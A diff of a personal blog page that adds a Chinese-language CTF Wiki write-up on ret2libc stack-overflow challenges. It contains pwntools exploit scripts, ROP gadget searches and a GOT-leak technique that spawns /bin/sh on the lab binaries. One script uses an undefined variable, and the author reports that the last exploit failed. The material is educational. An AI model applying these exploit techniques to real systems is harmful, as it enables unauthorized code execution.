@@ -130,10 +130,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://leo021017.github.io/tags/CSAPP-Lab/">
+  <link rel="canonical" href="https://leo021017.github.io/Lab/CTF-Wiki/pwn-wp/">
   <title>
     
-      Leo&#39;s Blog
+      CTF Wiki PWN Exp - Leo&#39;s Blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -306,19 +306,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/myBKG.jpg');
-      --intro-header-background-image-url-post: url('');
-      --intro-header-background-image-url-page: url('/img/header_img/archive_bg2.jpg');
+      --intro-header-background-image-url-post: url('/img/header_img/lml_bg.jpg');
+      --intro-header-background-image-url-page: url('//img/header_img/lml_bg.jpg');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/myBKG.jpg');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/archive_bg2.jpg');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/lml_bg.jpg');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/lml_bg.jpg');
     }
 
     header.intro-header {
-       /*page*/
-        background-image: var(--intro-header-background-image-url-page);
-        /* background-image: url('/img/header_img/archive_bg2.jpg'); */
+       /*post*/
+        background-image: var(--intro-header-background-image-url-post);
+        /* background-image: url('/img/header_img/lml_bg.jpg'); */
       
     }
 
@@ -340,10 +340,36 @@
       <div class="row">
         <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
           
-          <div class="site-heading">
-            <h1>Leo&#39;s Blog</h1>
-            <!--<hr class="small">-->
-            <span class="subheading">这里是知识的荒漠</span>
+          <div class="post-heading">
+            <div class="tags">
+              
+              <a class="tag" href="/tags/#PWN" title="PWN">PWN</a>
+              
+            </div>
+            <h1>CTF Wiki PWN Exp</h1>
+            <h2 class="subheading"></h2>
+            <span class="meta">
+              Posted by Leo on
+              2023-11-30
+            </span>
+
+
+            
+            <!-- WordCount start -->
+            <div class="blank_box"></div>
+            <span class="meta">
+              Estimated Reading Time <span class="post-count">6</span> Minutes
+            </span>
+            <div class="blank_box"></div>
+            <span class="meta">
+              Words <span class="post-count">1.4k</span> In Total
+            </span>
+            <div class="blank_box"></div>
+            <!-- WordCount end -->
+            
+            
+
+
           </div>
           
         </div>
@@ -384,520 +410,244 @@
 	Friends Blog、
 	anchorjs、
 	) -->
-		<!-- Main Content -->
-<div class="container">
-  <div class="row">
-    
+		<!-- Modify by Yu-Hsuan Yen -->
+<!-- Post Content -->
+<article>
+  <div class="container">
+    <div class="row">
+      <!-- Post Container -->
+      <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-    <!-- USE SIDEBAR -->
-    <!-- Post Container -->
-    <div class="
-                col-lg-8 col-lg-offset-1
-                col-md-8 col-md-offset-1
-                col-sm-12
-                col-xs-12
-                post-container
-            ">
+        <h2 id="ret2lic1">ret2lic1</h2>
+<p>程序给出了<code>system</code>的plt和字符串<code>/bin/sh</code>，直接构造payload，可以使用IDA Pro手动找<code>system</code>函数的plt表项地址，也可以使用pwntools的ELF对象自动找</p>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">bin_sh_addr = <span class="number">0x08048720</span></span><br><span class="line"><span class="comment"># system_addr = 0x08048460</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf08</span>-<span class="number">0xe9c</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh_addr)</span><br><span class="line">io = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ret2lic2">ret2lic2</h2>
+<p>这里缺少<code>/bin/sh</code>字符串，没有现成的，甚至<code>sh\x00</code>都没有，只能在构造ROP链中加上<code>gets</code>函数输入一个<code>/bin/sh</code>，第一个gadget读取字符串（可以使用<code>gets</code>函数的plt），第二个gadget执行 <code>system(&quot;/bin/sh&quot;)</code>，这里因为ROP链只有两个函数，所以可以不加<code>pop_ret</code>来平衡栈，即</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">108</span>+<span class="number">4</span>) + p32(gets_addr) + p32(system_addr) + p32(bin_sh_addr) + p32(bin_sh_addr)</span><br></pre></td></tr></table></figure>
+<p>若寻找<code>pop_ret</code>如下（只要是通用寄存器都行，不一定是ebx，不选ebp和esp担心影响函数栈帧）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ~/Desktop/buuctf/ctf-wiki-20:52 &gt;&gt;&gt; ROPgadget --bin ret2libc2 --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;ebx&#x27;</span></span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets_addr = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="comment"># pop_ret_addr = 0x0804843d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*(108+4) + p32(gets_addr) + p32(pop_ret_addr) + p32(bin_sh_addr) + p32(system_addr) + b&#x27;beef&#x27; + p32(bin_sh_addr)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">108</span>+<span class="number">4</span>) + p32(gets_addr) + p32(system_addr) + p32(bin_sh_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ret2lic3">ret2lic3</h2>
+<p><code>system</code>的plt和字符串<code>/bin/sh</code>都没有给，由于延迟绑定机制，如果程序中没有调用到<code>system</code>函数，就不会有<code>system</code>函数的plt表项，那就只能找到<code>system</code>函数在<strong>libc中的真实地址</strong></p>
+<p>首先使用一些方法泄露其他函数的GOT表项的地址（即Libc中该函数的地址），然后再泄露远程主机的Libc版本（比如LibcSearcher），就可以通过偏移量计算出远程主机所使用的Libc下<code>system</code>函数的地址，CTF Wiki给我总结了流程：</p>
+<ul>
+<li>泄露<code>__libc_start_main</code>地址</li>
+<li>获取 libc 版本</li>
+<li>获取<code>system</code>地址与<code>/bin/sh</code>的地址</li>
+<li>返回程序入口，再次执行源程序</li>
+<li>触发栈溢出执行<code>system(&quot;/bin/sh&quot;)</code></li>
+</ul>
+<p>因为开启了ASLR但没有开启PIE，可以在ROP链中使用<code>puts</code>函数将要泄露的地址输出到前端，从IDA Pro中找到GOT表项地址，将地址中存储的内容（要泄露的libc地址）输出在前端</p>
+<p>因为<code>__libc_start_main</code>是程序的入口，GOT表中肯定存在<code>__libc_start_main</code>这一项，所以一般选取<code>__libc_start_main</code>作为要泄露的地址，返回地址的选取有<code>main</code>函数和<code>_start</code>函数两种，注意PLT表中只有链接的标准函数，所以不会有<code>_start</code>和<code>main</code>表项，这两个作为程序入口是放在程序代码段的，但<code>libc_start_main</code>是动态链接的函数</p>
+<blockquote>
+<p>在程序的执行过程中，<code>_start</code>调用了<code>libc_start_main</code>，<code>libc_start_main</code>调用了<code>main</code></p>
+<p><code>__start</code>这个符号是程序的起始；<code>main</code>是被标准库调用的一个符号</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html">Linux x86 Program Start Up (dbp-consulting.com)</a>这篇文章把整个程序运行到<code>main</code>函数被调用的过程都讲了一遍，有时间看完后再总结一篇博客，<code>_start</code>函数如下（汇编实现的）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">080482e0 &lt;_start&gt;:</span><br><span class="line">80482e0:       31 ed                   xor    %ebp,%ebp</span><br><span class="line">80482e2:       5e                      pop    %esi</span><br><span class="line">80482e3:       89 e1                   mov    %esp,%ecx</span><br><span class="line">80482e5:       83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line">80482e8:       50                      push   %eax</span><br><span class="line">80482e9:       54                      push   %esp</span><br><span class="line">80482ea:       52                      push   %edx</span><br><span class="line">80482eb:       68 00 84 04 08          push   $0x8048400</span><br><span class="line">80482f0:       68 a0 83 04 08          push   $0x80483a0</span><br><span class="line">80482f5:       51                      push   %ecx</span><br><span class="line">80482f6:       56                      push   %esi</span><br><span class="line">80482f7:       68 94 83 04 08          push   $0x8048394</span><br><span class="line">80482fc:       e8 c3 ff ff ff          call   80482c4 &lt;__libc_start_main@plt&gt;</span><br><span class="line">8048301:       f4                      hlt</span><br></pre></td></tr></table></figure>
+<p>重点在于第三和第四行，直接引用原文</p>
+<blockquote>
+<p>The <strong>mov</strong> puts <strong>argv</strong> into <strong>%ecx</strong> without moving the stack pointer. Then we <strong>and</strong> the stack pointer with a mask that clears off the bottom four bits</p>
+</blockquote>
+<p>也就是操作系统会使用<code>execve</code>函数开启进程执行程序，<code>pop    %esi</code>将参数<code>argc</code>赋给<code>esi</code>，此时<code>esp</code>指向第二个参数<code>argv</code>，使用<code>mov</code>指令赋给<code>ecx</code>，使用<code>AND</code>逻辑操作将<code>esp</code>的最后四个字节变成0，<code>esp</code>会减小0-15个字节大小，起到了内存对齐的作用，有利于*“aligned for memory and cache efficiency”*，最重要的是这个语句起到了<strong>平衡堆栈</strong>的作用</p>
+<p>所以这里使用<code>_start</code>函数作为返回地址时，第二个发生payload的填充数据长度和第一次相同，而选择<code>main</code>函数的话，<code>main</code>没有平衡堆栈的操作，会使esp的值变大，相当于栈空间减小了，填充数据的长度也减小了，因为我们的libc版本</p>
+<p>使用gdb跟进调试会发现返回<code>main</code>函数后，栈的空间是0xfff7c150 - 0xfff7c0d0 = 0x80 = 128，栈的空间减小了8，所以填充数据长度从112变成了104</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">EBP</span>  <span class="number">0</span>xfff<span class="number">7</span>c<span class="number">150</span> ◂— <span class="number">0</span>x<span class="number">61616161</span> (&#x27;aaaa&#x27;)</span><br><span class="line"><span class="attribute">ESP</span>  <span class="number">0</span>xfff<span class="number">7</span>c<span class="number">0</span>d<span class="number">0</span> —▸ <span class="number">0</span>x<span class="number">804876</span>b ◂— inc ebx /* &#x27;Can you find it !?&#x27; */ </span><br></pre></td></tr></table></figure>
+<p>原来大小是0xffffcf08 - 0xffffce80 = 0x88 = 136</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">EBP</span>  <span class="number">0</span>xffffcf<span class="number">08</span> ◂— <span class="number">0</span>x<span class="number">0</span></span><br><span class="line"><span class="attribute">ESP</span>  <span class="number">0</span>xffffce<span class="number">80</span> —▸ <span class="number">0</span>xffffce<span class="number">9</span>c ◂— <span class="number">0</span>x<span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>这里可能因为LibcSeacher找不到正确的版本，没有打通</p>
+<p>我的exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = ret2libc3.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload1 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>, puts_plt, main, libc_start_main_got])</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hex()是将十进制整型转成十六进制字符串，u32()/u64()是将字节转成十进制整型，p32()/p64()是将整型（无进制要求）转成字节</span></span><br><span class="line">libc_start_main_addr = u32(io.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)</span><br><span class="line">libc_base = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>, system_addr, <span class="number">0xdeadbeef</span>, bin_sh_addr])</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-      <!-- Main Content -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-8 col-lg-offset-0 col-md-10 col-md-offset-1">
-      <!-- 归档列表 -->
 
-      
-
-      <!-- 归档列表 -->
-      
-      <div class="one-tag-list">
-        <span class="fa fa-calendar-times-o listing-seperator" id="2023">
-          <span class="tag-text">2023</span>
-        </span>
-        <ul>
+        <hr>
+        <!-- Pager -->
+        <ul class="pager">
           
-          <li>
-            12-06
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/ComputerNetwork/network-device/" style="color: #0085a1">
-              <span>
-                网络设备
-                
-                -- course
-                
-              </span>
-            </a>
+          <li class="previous">
+            <a href="/course/ComputerNetwork/network-device/" data-toggle="tooltip" data-placement="top" title="网络设备">&larr; Previous Post</a>
           </li>
           
-          <li>
-            11-30
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/CTF-Wiki/pwn-wp/" style="color: #0085a1">
-              <span>
-                CTF Wiki PWN Exp
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
           
-          <li>
-            11-29
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/BUUCTF/pwn-exp/" style="color: #0085a1">
-              <span>
-                BUUCTF PWN Exp
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-29
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/BUUCTF/pwn-wp/" style="color: #0085a1">
-              <span>
-                BUUCTF PWN Write up
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-26
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/pwn/" style="color: #0085a1">
-              <span>
-                PWN入门
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-25
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/ComputerNetwork/proxy/" style="color: #0085a1">
-              <span>
-                代理服务器原理（https, socks5）
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-25
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/other/一些配置/" style="color: #0085a1">
-              <span>
-                一些工具的配置方法
-                
-                -- other
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-19
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/ComputerNetwork/TLS/" style="color: #0085a1">
-              <span>
-                TLS协商过程
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            11-19
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/other/深信服认证/" style="color: #0085a1">
-              <span>
-                深信服认证题目摘要
-                
-                -- other
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-18
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/ComputerNetwork/port-scan/" style="color: #0085a1">
-              <span>
-                端口扫描的几种方式
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/Assembly/汇编/" style="color: #0085a1">
-              <span>
-                汇编语言程序设计（by fzy）笔记
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/CSAPP/lab0/" style="color: #0085a1">
-              <span>
-                CSAPP-Lab0
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-17
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/Top-Down/Programming/" style="color: #0085a1">
-              <span>
-                自顶向下编程练习
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            10-09
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/DSA/Pointer/" style="color: #0085a1">
-              <span>
-                指针学习笔记
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/CSAPP/lab2-bomb/" style="color: #0085a1">
-              <span>
-                CSAPP-Lab2
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-16
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/RNN/RNN/" style="color: #0085a1">
-              <span>
-                循环神经网络
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-16
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/DL基础知识/" style="color: #0085a1">
-              <span>
-                深度学习的一些基础知识
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            09-13
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/GNN/GNN/" style="color: #0085a1">
-              <span>
-                图神经网络
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-31
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/Transformer/" style="color: #0085a1">
-              <span>
-                Transformer
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-25
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/Transformer/Swing Transformer/" style="color: #0085a1">
-              <span>
-                Swin Transformer
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-24
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/Transformer/self-attention/" style="color: #0085a1">
-              <span>
-                自注意力机制
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-24
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/Transformer/Transformer/" style="color: #0085a1">
-              <span>
-                Transformer
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/EfficientNet/" style="color: #0085a1">
-              <span>
-                EfficientNet
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-23
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/Lab/report/" style="color: #0085a1">
-              <span>
-                实训2报告
-                
-                -- Lab
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-21
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/classic CNN/" style="color: #0085a1">
-              <span>
-                经典卷积网络
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            07-07
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/DeepLearning/CNN/CNN intro/" style="color: #0085a1">
-              <span>
-                卷积神经网络概述
-                
-                -- DeepLearning
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            06-28
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/course/OS/os/" style="color: #0085a1">
-              <span>
-                操作系统期末复习
-                
-                -- course
-                
-              </span>
-            </a>
-          </li>
-          
-          <li>
-            06-28
-            <i class="fa fa-angle-double-right" aria-hidden="true"></i>
-            <a href="/other/firstBlog/" style="color: #0085a1">
-              <span>
-                第一篇博客——杂谈
-                
-                -- other
-                
-              </span>
-            </a>
+          <li class="next">
+            <a href="/Lab/BUUCTF/pwn-exp/" data-toggle="tooltip" data-placement="top" title="BUUCTF PWN Exp">Next Post &rarr;</a>
           </li>
           
         </ul>
-      </div>
-      
-    </div>
-  </div>
+
+        
+        <!-- tip start -->
+        <!-- tip -->
+<!-- tip start -->
+<div class="tip">
+  <p>
+    
+      本着互联网开源的性质，欢迎分享这篇文章，以帮助到更多的人，谢谢！
+    
+  </p>
 </div>
+<!-- tip end -->
 
+        <!-- tip end -->
+        
 
-      <!-- 如果开启评论功能 -->
-      
-    </div>
+        
+        <!-- Sharing Srtart -->
+        <!--
+ * @Author: Leo
+ * @Date: 2023-06-26 15:50:28
+ * @LastEditTime: 2023-06-28 23:04:59
+ * @FilePath: \MyBlog\themes\livemylife\layout\_partial\socialshare.ejs
+ * @Description: Leo的一些没用的代码
+-->
+<!-- Social Social Share Post -->
+<!-- Docs:https://github.com/overtrue/share.js -->
 
-    <!-- Sidebar Container -->
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
-    
-        <!-- Short About -->
-<section class="visible-md visible-lg">
-  <h5><a href="/about/">ABOUT ME</a></h5>
-  <div class="short-about">
-
-    
-    <img id="avatar_pic" src="/img/avatar/myAvatar.jpg" alt="avatar_pic" style="box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -moz-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);
-    -webkit-box-shadow: 5px 5px 10px 5px rgba(0, 0, 0, .5);" />
-    
-
-    
-    <p>四川大学 网络空间安全学院</p>
-    
-
-    <!-- SNS Link -->
-    <ul class="list-inline">
-      
-
-      
-      <li>
-        <a target="_blank" href="https://github.com/Leo021017">
-          <span class="fa-stack fa-lg">
-            <i class="fa fa-circle fa-stack-2x"></i>
-            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-          </span>
-        </a>
-      </li>
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-      
-
-    </ul>
-  </div>
-</section>
-
-        <hr>
-    
-        <!-- RECENT POSTS -->
-
-<h5><a href="/">RECENT POSTS</a></h5>
-<div class="widget">
-  <ul>
-    
-    <a href="../../course/ComputerNetwork/network-device/">
-      <li>网络设备</li>
-    </a>
-    
-    <a href="../../Lab/CTF-Wiki/pwn-wp/">
-      <li>CTF Wiki PWN Exp</li>
-    </a>
-    
-    <a href="../../Lab/BUUCTF/pwn-exp/">
-      <li>BUUCTF PWN Exp</li>
-    </a>
-    
-    <a href="../../Lab/BUUCTF/pwn-wp/">
-      <li>BUUCTF PWN Write up</li>
-    </a>
-    
-    <a href="../../course/pwn/">
-      <li>PWN入门</li>
-    </a>
-    
+<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
+  <ul class="list-inline text-center social-share-ul">
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-twitter">
+        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <li class="social-share-li">
+      <a class="social-share-icon icon-wechat">
+        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <!-- <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-weibo">
+        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
+      </a>
+    </li> -->
+    <li class="social-share-li">
+      <a target="_blank" class="social-share-icon icon-qq">
+        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
+      </a>
+    </li>
+    <!-- <li class="social-share-li">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=CTF Wiki PWN Exp&body=Hi,I found this website and thought you might like it https://leo021017.github.io/Lab/CTF-Wiki/pwn-wp/">
+        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
+      </a>
+    </li> -->
   </ul>
 </div>
 
+<!-- css & js -->
+<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
+<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
 
-        <hr>
+        <!-- Sharing End -->
+        
+        <!-- <hr> -->
+
+        <!-- comments start -->
+        <!-- 1. gitalk comment -->
+
+
+<!-- 2. gitment comment -->
+
+
+<!-- 3. disqus comment -->
+
+
+        <!-- comments end -->
+        <!-- <hr> -->
+
+      </div>
+
+      <!-- Catalog: Tabe of Content -->
+      <!-- Table of Contents -->
+
     
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2lic1"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">ret2lic1</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2lic2"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">ret2lic2</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ret2lic3"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">ret2lic3</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+
+
+      <!-- Sidebar Container -->
+      <div class="
